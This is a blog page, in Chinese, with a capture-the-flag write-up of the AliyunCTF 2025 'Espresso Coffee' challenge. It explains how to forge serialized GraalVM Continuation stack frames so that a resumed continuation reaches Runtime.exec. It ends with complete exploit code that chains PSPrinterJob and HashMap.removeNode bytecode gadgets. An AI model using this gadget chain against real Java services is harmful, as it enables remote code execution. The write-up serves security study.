@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            AliyunCTF2025-Espresso Coffee 详解
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目考点关于jdk21 graalvm反序列化，其中关键类是org.graalvm.continuations.Continuation</p>
+<p>Continuation使用例子如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.graalvm.continuations.Continuation;</span><br><span class="line">public class ContinuationExample &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        Continuation continuation = Continuation.create(new MyEntryPoint());</span><br><span class="line">        continuation.resume();</span><br><span class="line">        continuation.resume();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>MyEntryPoint</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.graalvm.continuations.ContinuationEntryPoint;</span><br><span class="line">import org.graalvm.continuations.SuspendCapability;</span><br><span class="line">public class MyEntryPoint implements ContinuationEntryPoint &#123;</span><br><span class="line">    public void start(SuspendCapability suspendCapability) throws Throwable &#123;</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">            System.out.println(&quot;[INFO] &quot; + i);</span><br><span class="line">            suspendCapability.suspend();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Continuation执行resume，会进入EntryPoint#start，如果遇到suspend，那么就结束，下一次resume会从上一次suspend的位置开始继续执行。</p>
+<p>Continuation一定有一个属性，存储着这些方法执行记录，才能够知道resume该从什么位置开始。</p>
+<p>Continuation可以被序列化和反序列化，<br>那么，这些方法的执行记录，同样可以被序列化和反序列化。</p>
+<p>如何修改Continuation的方法执行记录，<br>让他下一次resume时去到恶意方法，执行我们想要的命令，是本题的关键。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/aliyunctf-2025-coffee/image1.png" alt="image1.png"></p>
+<h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><p>调试环境用这个：<a target="_blank" rel="noopener" href="https://github.com/oracle/graal/blob/master/espresso/docs/serialization.md">https://github.com/oracle/graal/blob/master/espresso/docs/serialization.md</a></p>
+<p>简化版：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example.test;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.nio.file.*;</span><br><span class="line">import org.graalvm.continuations.*;</span><br><span class="line">import static java.nio.file.StandardOpenOption.*;</span><br><span class="line"></span><br><span class="line">public class PersistentApp implements ContinuationEntryPoint, Serializable &#123;</span><br><span class="line">    private static final String DEFAULT_PATH = &quot;state.serial.bin&quot;;</span><br><span class="line">    int counter = 0;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void start(SuspendCapability suspendCapability) &#123;</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            counter++;</span><br><span class="line">            System.out.println(&quot;The counter value is now &quot; + counter);</span><br><span class="line">            doWork(suspendCapability);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void doWork(SuspendCapability suspendCapability) &#123;</span><br><span class="line">        suspendCapability.suspend();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        checkSupported();</span><br><span class="line"></span><br><span class="line">        Path storagePath = Paths.get(DEFAULT_PATH);</span><br><span class="line">        MyJavaSerializer myJavaSerializer = new MyJavaSerializer();</span><br><span class="line"></span><br><span class="line">        Continuation continuation;</span><br><span class="line">        if (!Files.exists(storagePath)) &#123;</span><br><span class="line">            continuation = Continuation.create(new PersistentApp());</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            continuation = myJavaSerializer.readObject(storagePath);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        continuation.resume();</span><br><span class="line">        myJavaSerializer.writeObject(continuation, storagePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void checkSupported() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (!Continuation.isSupported()) &#123;</span><br><span class="line">                System.err.println(&quot;Ensure you are running on an Espresso VM with the flags &#x27;--experimental-options --java.Continuum=true&#x27;.&quot;);</span><br><span class="line">                System.exit(1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (NoClassDefFoundError e) &#123;</span><br><span class="line">            System.err.println(&quot;Please make sure you are using a VM that supports the Continuation API&quot;);</span><br><span class="line">            System.exit(1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class MyJavaSerializer&#123;</span><br><span class="line">    public Continuation readObject(Path storagePath) throws Exception &#123;</span><br><span class="line">        try (var in = new ObjectInputStream(Files.newInputStream(storagePath, READ))) &#123;</span><br><span class="line">            return (Continuation) in.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void writeObject(Continuation continuation, Path storagePath) throws Exception &#123;</span><br><span class="line">        try (var out = new ObjectOutputStream(Files.newOutputStream(storagePath, CREATE, TRUNCATE_EXISTING, WRITE))) &#123;</span><br><span class="line">            out.writeObject(continuation);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一次运行resume，会产生一个序列化文件，第二次运行，读取该文件，反序列化，断点打在resume之前，查看continuation的内容。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/aliyunctf-2025-coffee/image2.png" alt="image2.png"></p>
+<p>当时看了一下午，才大概有点头绪。Continuation有一个FrameRecord属性，叫做stackFrameHead（栈帧），这个东西记录了哪个方法执行到了哪个位置，反序列化后，这个东西的内容决定了下一次resume该怎么走。（注意，第一次执行resume，stackFrameHead为null，此时他的内容是在navtive的内存里（猜测），只有第二次运行反序列化后才看得见。）</p>
+<p>上图中，程序的入口是run方法，执行到subspend后，就把当前的帧全部记录，每个帧都会保存当前执行到什么方法（method），方法执行到什么位置（bci），当前方法内的对象（pointers）</p>
+<p>pointers[0] 表示当前对象this，pointers[1]<br>表示第一个方法参数，方法参数表示完毕后，剩下的就是局部变量。如果是静态方法，那么pointers[0]<br>就是第一个方法参数。</p>
+<p>那现在思路就明确了，把其中一个栈帧的method设成Runtime的exec或者别的恶意方法，就行了，接下来看看具体操作和细节。</p>
+<h1 id="字节码指令解析"><a href="#字节码指令解析" class="headerlink" title="字节码指令解析"></a>字节码指令解析</h1><p>在此之前，需要知道bci是什么，以及java字节码是如何执行的。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://github.com/xfhy/Android-Notes/blob/master/Blogs/Java/JVM/4.Java%E5%AD%97%E8%8A%82%E7%A0%81(class%E6%96%87%E4%BB%B6)%E8%A7%A3%E8%AF%BB.md">字节码指令参照表</a>，<a target="_blank" rel="noopener" href="https://github.com/xfhy/Android-Notes/blob/master/Blogs/Java/JVM/7.%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AD%97%E8%8A%82%E7%A0%81%E6%89%A7%E8%A1%8C%E5%BC%95%E6%93%8E.md#head6">jvm执行引擎</a></p>
+<p>bci：byteCode index，使用javap命令可以查看：</p>
+<p>javap -c -p java.lang.Runtime</p>
+<p>产生的结果有很多，以exec为例</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/aliyunctf-2025-coffee/image3.png" alt="image3.png"></p>
+<p>最左边的数字就是bci。</p>
+<p>方法开始执行之前，先创建一个局部变量表，把实例填入0，方法参数往后填。局部变量表，就是题目continuation栈帧的pointers属性。</p>
+<p>aload_0 局部变量表0处的变量入栈</p>
+<p>aload_1 局部变量表1处的变量入栈</p>
+<p>aconst_null null入栈</p>
+<p>aconst_null null 入栈</p>
+<p>invokevirtual 这个方法有3个参数，弹栈4次，得到 null null string<br>this，调用this.exec(string,null,null)，返回值入栈</p>
+<p>areturn 弹栈，元素做返回值，返回给上一层的调用者。</p>
+<p>回到题目，如果我们想通过跳转字节码的方式执行exec，就只能跳转到上面的指令往下执行。</p>
+<p>测试发现：</p>
+<ol>
+<li><p>跳转字节码从bci指向的下一条指令开始执行</p>
+</li>
+<li><p>bci指向的值，只能是invoke类型的指令，换成别的指令一律报错：Target<br>bci is not a valid bytecode.&gt;</p>
+</li>
+</ol>
+<p>那上面的exec是不能直接跳了，如果bci设置为4，那么下一次执行的就是areturn，直接返回了。</p>
+<p>再看一个例子，windows下。linux和mac对应的类是UnixPrinterJob。</p>
+<p>javap -p -c sun.print.PSPrinterJob$PrinterSpooler</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/aliyunctf-2025-coffee/image4.png" alt="image4.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/aliyunctf-2025-coffee/image5.png" alt="image5.png"></p>
+<p>假如bci设置为83，那么下一次执行的指令就是86。</p>
+<p>astroe_2，把栈顶元素设置到pointers[2]，由于是刚开始执行，栈是空的，所以pointers[2]就变成了null。</p>
+<p>invokestatic 调用getRuntime，返回runtime对象，入栈。</p>
+<p>aload_2，pointers[2] 入栈</p>
+<p>invokevirtual，弹栈2次，runtime.exec(null)</p>
+<p>由于没有用到this，所以pointers[0]可以传null以及别的东西。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/aliyunctf-2025-coffee/image6.png" alt="image6.png"></p>
+<h1 id="控制返回值"><a href="#控制返回值" class="headerlink" title="控制返回值"></a>控制返回值</h1><p>感觉就差一点了，现在83这个位置已经是绝佳位置了，再往上就要碰到this了，跳不得。</p>
+<p>我想，如果再加一个栈帧会发生什么？比如把当前的栈帧复制一份，再接到后面。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/aliyunctf-2025-coffee/image7.png" alt="image7.png"></p>
+<p>run执行了2次。</p>
+<p>看第一次run时候的idea调试光标，停留在printExecCmd的位置</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/aliyunctf-2025-coffee/image8.png" alt="image8.png"></p>
+<p>这下就搞清楚了，第一帧bci为83，对应的方法就是printExecCmd，此时他后面还有有一帧，那么jvm就认为，是通过进入printExecCmd方法所产生的帧，所以光标停留在这个位置。</p>
+<p>那么如果能控制后面帧的返回值，是不是就相当于控制了printExecCmd的返回值？</p>
+<p>经过艰难搜索字节码发现一个完美的gadget，位于HashMap的removeNode中：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/aliyunctf-2025-coffee/image9.png" alt="image9.png"></p>
+<p>第二帧的bci设置为283，从286开始执行</p>
+<p>aload 10 pointers[10] 入栈</p>
+<p>areturn 栈顶元素返回。</p>
+<p>所以只需要第二帧的pointers[10]设置为String[]{&quot;calc&quot;}，就能够执行命令了。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/aliyunctf-2025-coffee/image10.png" alt="image10.png"></p>
+<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><p>还有最后一个问题。</p>
+<p>经过调试发现，stackFreamHead的第一帧，必须是ContinuationImpl的run方法，第二帧，必须是ContinuationEntryPoint的start方法，这两帧不能改成自己的，否则会报错：Wrong<br>method on the recorded frames。</p>
+<p>第二帧，ContinuationEntryPoint是个接口，题目中没有实现类，我们先前的测试都是基于自己的写的实现类，远程环境可没有。</p>
+<p>怎么办呢，用动态代理即可。</p>
+<p>自定义一个InvocationHandler</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class MyInvocationHandler implements InvocationHandler, Serializable &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">        ((SuspendCapability)args[0]).suspend();</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Continuation这样创建</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object o = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;ContinuationEntryPoint.class&#125;, new MyInvocationHandler());</span><br><span class="line">continuation = Continuation.create((ContinuationEntryPoint) o);</span><br></pre></td></tr></table></figure>
+
+<p>这样产生的帧第二帧start就是我们动态代理的start方法。</p>
+<p>但是远程环境没有我们的InvocationHandler，反序列化会失败，所以在产生完帧之后，得手动修改Handler为jdk存在的handler。handler不参与方法调用，用啥都行。</p>
+<h1 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h1><p>第一次运行，产生序列化文件，第二次运行，反序列化。</p>
+<p>在原来的PersistApp的基础上只修改main方法，其他不变</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    checkSupported();</span><br><span class="line"></span><br><span class="line">    Path storagePath = Paths.get(DEFAULT_PATH);</span><br><span class="line">    MyJavaSerializer myJavaSerializer = new MyJavaSerializer();</span><br><span class="line"></span><br><span class="line">    Continuation continuation;</span><br><span class="line">    if (!Files.exists(storagePath)) &#123;</span><br><span class="line">        Object o = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;ContinuationEntryPoint.class&#125;, new MyInvocationHandler());</span><br><span class="line">        continuation = Continuation.create((ContinuationEntryPoint) o);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        continuation = myJavaSerializer.readObject(storagePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    continuation.resume();</span><br><span class="line">    ContinuationModify.modify(continuation);</span><br><span class="line">    myJavaSerializer.writeObject(continuation, storagePath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ContinuationModify</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ContinuationModify &#123;</span><br><span class="line"></span><br><span class="line">    public static Object makeFrame(Object[] pointers,long[] primitives,Method method,int bci) throws Exception&#123;</span><br><span class="line">        Class aClass = Class.forName(&quot;org.graalvm.continuations.ContinuationImpl$FrameRecord&quot;);</span><br><span class="line">        Object newNext = Util17.createWithConstructor(aClass, aClass,</span><br><span class="line">                new Class[]&#123;Object[].class,long[].class, Method.class, int.class&#125;,</span><br><span class="line">                new Object[]&#123;pointers,primitives,method,bci&#125;);</span><br><span class="line">        return newNext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object makeInvocationHandler() throws Exception&#123;</span><br><span class="line">        Class AnnotationInvocationHandler_class = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Object invocationHandler = Util17.createWithoutConstructor(AnnotationInvocationHandler_class);</span><br><span class="line">        Util17.setFieldValue(invocationHandler, &quot;type&quot;,Override.class);</span><br><span class="line">        Util17.setFieldValue(invocationHandler, &quot;memberValues&quot;,new HashMap&lt;&gt;());</span><br><span class="line">        return invocationHandler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 参考ContinuationImpl的writeObject方法，手动令stackFrameHead产生内容</span><br><span class="line">    public static Object lockAndEnsureMaterialized(Continuation continuation) throws Exception&#123;</span><br><span class="line">        Class continuationImpl_class = Class.forName(&quot;org.graalvm.continuations.ContinuationImpl&quot;);</span><br><span class="line">        Method lock = Util17.getMethod(continuationImpl_class, &quot;lock&quot;, new Class[]&#123;&#125;);</span><br><span class="line">        Method ensureMaterialized = Util17.getMethod(continuationImpl_class, &quot;ensureMaterialized&quot;, new Class[]&#123;&#125;);</span><br><span class="line">        Object lockState = lock.invoke(continuation);</span><br><span class="line">        ensureMaterialized.invoke(continuation);</span><br><span class="line">        return lockState;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void unlock(Continuation continuation,Object lockState) throws Exception&#123;</span><br><span class="line">        Class continuationImpl_class = Class.forName(&quot;org.graalvm.continuations.ContinuationImpl&quot;);</span><br><span class="line">        Class state_class = Class.forName(&quot;org.graalvm.continuations.ContinuationImpl$State&quot;);</span><br><span class="line">        Method unlock = Util17.getMethod(continuationImpl_class, &quot;unlock&quot;, new Class[]&#123;state_class&#125;);</span><br><span class="line">        unlock.invoke(continuation,lockState);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object makeNext1() throws Exception&#123;</span><br><span class="line">        Class PrinterSpooler_class = Class.forName(&quot;sun.print.PSPrinterJob$PrinterSpooler&quot;);</span><br><span class="line">        Method method = Util17.getMethod(PrinterSpooler_class,&quot;run&quot;,new Class[]&#123;&#125;);</span><br><span class="line">        int len = 15;</span><br><span class="line">        Object[] pointers = new Object[len];</span><br><span class="line">        long[] primitives = new long[len];</span><br><span class="line">        int bci = 83;</span><br><span class="line">        primitives[0] = 89 ;</span><br><span class="line">        Object newFrame = makeFrame(pointers, primitives, (Method) method, (int)bci);</span><br><span class="line">        return newFrame;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object makeNext2() throws Exception&#123;</span><br><span class="line">        int len2 = 15;</span><br><span class="line">        Object[] pointers2 = new Object[len2];</span><br><span class="line">        long[] primitives2 = new long[len2];</span><br><span class="line">        int bci2 = 283;</span><br><span class="line">        primitives2[0] = bci2 +1;</span><br><span class="line">        Method method2 = Util17.getMethod(Class.forName(&quot;java.util.HashMap&quot;),&quot;removeNode&quot;,new Class[]&#123;</span><br><span class="line">                int.class, Object.class, Object.class, boolean.class, boolean.class</span><br><span class="line">        &#125;);</span><br><span class="line">        pointers2[1] = null;</span><br><span class="line">        pointers2[9] = new String[]&#123;&quot;calc&quot;&#125;;</span><br><span class="line">        pointers2[10] = new String[]&#123;&quot;calc&quot;&#125;;</span><br><span class="line">        pointers2[11] = new String[]&#123;&quot;calc&quot;&#125;;</span><br><span class="line"></span><br><span class="line">        Object newFrame2 = makeFrame(pointers2, primitives2, method2,bci2);</span><br><span class="line">        return newFrame2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void modify(Continuation continuation) throws Exception&#123;</span><br><span class="line">        Object invocationHandler = makeInvocationHandler();</span><br><span class="line">        Object entryPoint = Util17.getFieldValue(continuation, &quot;entryPoint&quot;);</span><br><span class="line">        Util17.setFieldValue(entryPoint, &quot;h&quot;,invocationHandler);</span><br><span class="line"></span><br><span class="line">        Object lock_state = lockAndEnsureMaterialized(continuation);</span><br><span class="line"></span><br><span class="line">        Object stackFrameHead = Util17.getFieldValue(continuation, &quot;stackFrameHead&quot;);</span><br><span class="line">        Object next1 = Util17.getFieldValue(stackFrameHead, &quot;next&quot;);</span><br><span class="line">        Object next2 = Util17.getFieldValue(next1, &quot;next&quot;);</span><br><span class="line">        Object next3 = Util17.getFieldValue(next2, &quot;next&quot;);</span><br><span class="line"></span><br><span class="line">        Object newFrame = makeNext1();</span><br><span class="line">        Object newFrame2 = makeNext2();</span><br><span class="line"></span><br><span class="line">        Util17.setFieldValue(next1, &quot;next&quot;,newFrame);</span><br><span class="line">        Util17.setFieldValue(newFrame, &quot;next&quot;,newFrame2);</span><br><span class="line">        Util17.setFieldValue(newFrame2, &quot;next&quot;,next3);</span><br><span class="line"></span><br><span class="line">        unlock(continuation,lock_state);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-text">调试环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%8C%87%E4%BB%A4%E8%A7%A3%E6%9E%90"><span class="toc-text">字节码指令解析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E8%BF%94%E5%9B%9E%E5%80%BC"><span class="toc-text">控制返回值</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-text">动态代理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E7%BB%88exp"><span class="toc-text">最终exp</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
